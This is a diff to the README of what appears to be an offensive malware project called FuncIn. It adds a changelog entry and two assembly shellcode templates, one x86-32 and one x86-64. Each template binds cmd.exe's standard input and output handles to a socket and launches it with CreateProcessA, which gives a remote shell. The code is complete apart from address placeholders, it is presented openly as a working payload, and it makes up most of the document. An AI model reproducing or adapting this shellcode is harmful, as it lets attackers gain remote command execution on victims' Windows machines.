@@ -23,16 +23,129 @@ The modular nature of the malware, with the final payloads not being directly in
 
 ## WIP
 
-* x86-64 Remote Shell Shellcode
 * Demonstrate with additional programming languages (Next is Python)
 
 ## Changelog
+
+## 15 Dec 2023
+
+* x86-64 version of the FuncIn Shellcode implemented
+* Few Improvements
 
 ## 13 Dec 2023
 
 * Release (Delphi Loader & Controller)
 
-## Greetings go to
+## FuncIn Code Templates
+
+### x86-32
+
+```nasm
+; @DarkCoderSc
+mov ebp, esp
+sub esp, 0x4
+mov edx, <SizeOf(TStartupInfoA)>
+sub esp, edx
+mov edi, esp
+mov ecx, edx
+xor eax, eax
+rep stosb
+mov esi, <SocketFd>
+mov dword ptr [esp], edx
+mov dword ptr [esp + 0x2c], 0x101
+mov word ptr [esp + 0x30], 0x0
+mov dword ptr [esp + 0x38], esi
+mov dword ptr [esp + 0x3c], esi
+mov dword ptr [esp + 0x40], esi
+mov esi, esp
+sub esp, <SizeOf(TProcessInformation)>
+mov [ebp-0x4], esp
+push 0x00657865
+push 0x2E646D63
+mov edx, esp
+xor eax, eax
+push [ebp-0x4]
+push esi
+push eax
+push eax
+push 0x10
+push 0x1
+push eax
+push eax
+push edx
+push eax
+mov eax, <CreateProcessA>
+call eax
+xor eax, eax
+dec eax
+push eax
+mov eax, [ebp-0x4]
+push [eax]
+mov eax, <WaitForSingleObject>
+call eax
+xor eax, eax
+push eax
+mov eax, <ExitThread>
+call eax
+```
+
+### x86-64
+
+```nasm
+; @DarkCoderSc
+mov r15, <SizeOf(TStartupInfoA)>
+sub rsp, r15
+mov rdi, rsp
+mov rcx, r15
+xor rax, rax
+rep stosb
+mov r14, <SocketFd>
+mov qword ptr [rsp], r15
+mov dword ptr [rsp + 0x3c], 0x101
+mov word ptr [rsp + 0x40], 0x0
+mov qword ptr [rsp + 0x50], r14
+mov qword ptr [rsp + 0x58], r14
+mov qword ptr [rsp + 0x60], r14
+mov r14, rsp
+sub rsp, <SizeOf(TProcessInformation)>
+mov r15, rsp
+mov rax, 0x006578652E646D63
+push rax
+mov r13, rsp
+xor rax, rax
+mov rcx, rax
+mov rdx, r13
+xor r8, r8
+xor r9, r9
+push r15
+push r14
+push rax
+push rax
+xor rbx, rbx
+mov bl, 0x10
+push rbx
+inc rax
+push rax
+dec rax
+push rax
+push rax
+push rax
+push rax
+mov rax, <CreateProcessA>
+call rax
+mov rcx, r15
+mov rcx, [rcx]
+xor rdx, rdx
+dec rdx
+mov rax, <WaitForSingleObject>
+call rax
+xor rcx, rcx
+mov rax, <ExitThread>
+call rax
+
+```
+
+## Greetings goes to
 
 - [Keystone Engine](https://www.keystone-engine.org)
 
